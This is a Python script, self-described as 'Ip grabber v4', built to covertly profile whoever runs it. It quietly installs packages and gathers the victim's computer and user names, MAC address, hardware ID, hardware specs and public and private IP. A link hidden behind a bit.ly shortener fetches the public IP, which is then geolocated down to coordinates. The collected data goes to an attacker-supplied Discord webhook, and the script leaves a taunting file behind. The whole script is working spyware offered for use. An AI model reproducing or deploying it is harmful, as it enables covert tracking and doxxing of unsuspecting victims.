import os
os.system('pip install getmac')
os.system('cls')
os.system('pip install discord_webhook')
os.system('cls')
os.system('pip install geoip2')
os.system('cls')
import requests
import subprocess 
import os
import geoip2.database
import socket
import platform
import time
import tempfile
import datetime
import getmac
import getpass 
from getmac import get_mac_address
import wmi
import datetime
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen
from uuid import getnode as get_mac


hook = 'WEBHOOK-HERE'


computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
computer = wmi.WMI()
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]
system_ram = str(int(float(os_info.TotalVisibleMemorySize) / 1048576))


Date = datetime.date.today()


mac = getmac.get_mac_address()


profiles = 'None' 

pcname = os.getenv('COMPUTERNAME')
pcuname = os.getenv("UserName")


hwid = str(subprocess.check_output(
    'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()


PIP = socket.gethostname()
Privateip = socket.gethostbyname(PIP)


ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
#bitly      -->      https://api.ipify.org/

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()

webhook = DiscordWebhook(url=f'{hook}', username='Ip grabber', content=f'''
Ip grabber v4

Pc info:
Operating system: {platform.system()}
Version: {platform.release()}
Pc Name: {pcuname}
Pc UserName: {pcname}\nMac Adress: {mac}
Grapic Card: {gpu_info.Name}
Processor: {proc_info.Name}
Hardware ID: {hwid}
Ram: {system_ram}GB

Ip adresses:
Public Ip Adress: {ip}
Private Ip Adress: {Privateip}

Ip adress information ({ip}):
Country: {geo['country']}
City: {geo['city']}
Region: {geo['region']}
Continent: {geo['continent']}
Latitude: {geo['lat']}
Longtude: {geo['lon']}
Isp: {geo['isp']}

Saved wifi passwords:
{profiles}

Date: {Date}

Made by <@738138455476797581>

''')
response = webhook.execute()


fd, cu3tgrabber = tempfile.mkstemp()
f1  = open(cu3tgrabber, 'w')
f1.write('You got ip grabbed. \n\nCreated by Cuet#1337')
f1.close()
# Ending.
# Created by Cuet#1337